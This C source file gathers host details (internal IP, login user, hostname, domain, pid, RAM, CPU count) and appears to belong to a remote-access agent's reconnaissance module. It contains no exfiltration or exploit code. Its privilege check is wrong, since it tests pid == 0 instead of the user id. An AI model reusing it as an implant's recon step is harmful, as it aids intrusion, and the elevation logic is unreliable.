#include "OSConfig.h"
#include "../Common/shaco_stdlib.h"
#include "../Common/Network.h"

#include <unistd.h>
#include <sys/sysinfo.h>
#include <string.h>
#include <ifaddrs.h>

static POSCONFIG osconfig = NULL;

bool get_internal_ip(char *mem){
    if(!mem) return false;
    struct ifaddrs *ifaddrs = NULL, *ifa = NULL;
    if(getifaddrs(&ifaddrs) == -1) { return false;}
    ifa = ifaddrs;
    while(ifa){
        if(ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET ){
            struct sockaddr_in *pAddr = (struct sockaddr_in *)ifa->ifa_addr;
            uint32_t ip = s_ntohl(pAddr->sin_addr.s_addr);
            if((ip & 0xFF000000) != 0x7F000000){
                s_inet_ntop(AF_INET, &(pAddr->sin_addr), mem, INET_ADDRSTRLEN);
                freeifaddrs(ifaddrs);
                return true;
            }
        }
        ifa = ifa->ifa_next;
    }

    freeifaddrs(ifaddrs);
    return false;
}

POSCONFIG get_os_config(){

    if(osconfig != NULL)
        return osconfig;

    POSCONFIG cfg = (POSCONFIG)shaco_calloc(sizeof(OSCONFIG),1);
    if(!cfg) return NULL;

    struct sysinfo mem_info;

    if(sysinfo(&mem_info) != 0 ) goto EXIT_FAIL;
    if(getlogin_r(cfg->user, LOGIN_NAME_MAX + 1) != 0) goto EXIT_FAIL;
    if(gethostname(cfg->hostname, sizeof(cfg->hostname)) != 0) goto EXIT_FAIL;
    if(!get_internal_ip(cfg->internal_ip)) StringCopy(cfg->internal_ip, "127.0.0.1"); //TODO: get internal ip
    getdomainname(cfg->domain,254);
    cfg->pid = getpid();
    cfg->elevated = (cfg->pid == 0 ? true : false);
    cfg->ram_size = mem_info.totalram;
    cfg->processors = get_nprocs();

    return cfg;

EXIT_FAIL:
    shaco_free(cfg);
    return NULL;
}

/*
 *    internal_ip_t *ips = get_internal_ips();

    for (int i = 0; ips[i].adapter_name[0] != '\0'; i++) {
        printf("%d: %s - IP: %s\n", i+1, ips[i].adapter_name, ips[i].ip);
    }

    free(ips);
 *
 * */
